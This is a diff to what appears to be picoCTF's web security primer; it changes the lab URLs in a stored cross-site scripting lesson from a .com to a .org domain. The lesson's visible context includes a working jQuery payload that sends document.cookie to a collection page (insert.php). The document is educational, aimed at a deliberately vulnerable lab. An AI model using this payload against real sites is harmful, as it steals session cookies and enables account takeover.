@@ -296,11 +296,11 @@ Note: If you really don't want to use Firefox, every browser has a debugger that
 
 Using Firefox, input your name and some text in the description in the following link:
 
-https://primer.picoctf.com/vuln/web/sign_up.php[https://primer.picoctf.com/vuln/web/sign_up.php, window="_blank"]
+https://primer.picoctf.org/vuln/web/sign_up.php[https://primer.picoctf.org/vuln/web/sign_up.php, window="_blank"]
 
 Open another tab and visit the following link. You should see your name and description:
 
-https://primer.picoctf.com/vuln/web/tableusers.php[https://primer.picoctf.com/vuln/web/tableusers.php, window="_blank"]
+https://primer.picoctf.org/vuln/web/tableusers.php[https://primer.picoctf.org/vuln/web/tableusers.php, window="_blank"]
 
 
 Now, in the Firefox Menu, click "Web Developer" and then click "Debugger". You should see a pane like the following:
@@ -319,7 +319,7 @@ You can only see your cookie. Other users would see their cookie with their name
 
 For now, access this link again:
 
-https://primer.picoctf.com/vuln/web/sign_up.php[https://primer.picoctf.com/vuln/web/sign_up.php, window="_blank"]
+https://primer.picoctf.org/vuln/web/sign_up.php[https://primer.picoctf.org/vuln/web/sign_up.php, window="_blank"]
 
 Create a new user that has your name, but instead of the description has the following code:
 
@@ -328,7 +328,7 @@ Create a new user that has your name, but instead of the description has the fol
 
 If you navigate this link again, you will see your JavaScript code triggered:
 
-https://primer.picoctf.com/vuln/web/tableusers.php[https://primer.picoctf.com/vuln/web/tableusers.php, window="_blank"]
+https://primer.picoctf.org/vuln/web/tableusers.php[https://primer.picoctf.org/vuln/web/tableusers.php, window="_blank"]
 
 Like this:
 
@@ -338,7 +338,7 @@ image::images/image16.png[image,width=624,height=370]
 
 You just verified that you can inject JavaScript in the website. Now we are going to inject JavaScript that will steal the cookie. Create another user in the same link for creating users:
 
-https://primer.picoctf.com/vuln/web/sign_up.php[https://primer.picoctf.com/vuln/web/sign_up.php, window="_blank"]
+https://primer.picoctf.org/vuln/web/sign_up.php[https://primer.picoctf.org/vuln/web/sign_up.php, window="_blank"]
 
 But now, put this JavaScript code in the description:
 
@@ -346,7 +346,7 @@ But now, put this JavaScript code in the description:
 <script src="https://code.jquery.com/jquery-3.4.1.min.js"> </script>
 <script>
 $.get(
-    "https://primer.picoctf.com/vuln/web/insert.php",
+    "https://primer.picoctf.org/vuln/web/insert.php",
     {cookie : document.cookie, hackername : 'YourName'},
     function(data) {
         alert("I just stole the cookie!");
@@ -372,7 +372,7 @@ Is simply a function that will be executed after the request is sent to the serv
 
 Now visit this site again:
 
-https://primer.picoctf.com/vuln/web/tableusers.php[https://primer.picoctf.com/vuln/web/tableusers.php, window="_blank"]
+https://primer.picoctf.org/vuln/web/tableusers.php[https://primer.picoctf.org/vuln/web/tableusers.php, window="_blank"]
 
 When a user visits that site is when the JavaScript is executed and the cookie is stolen. You should see the message:
 
@@ -384,7 +384,7 @@ If you injected scripts previously, all those scripts are stored in the web site
 
 Now you should be able to see the cookie you stole here:
 
-https://primer.picoctf.com/vuln/web/tablestolen.php[https://primer.picoctf.com/vuln/web/tablestolen.php, window="_blank"]
+https://primer.picoctf.org/vuln/web/tablestolen.php[https://primer.picoctf.org/vuln/web/tablestolen.php, window="_blank"]
 
 [.text-center]
 .Table showing results
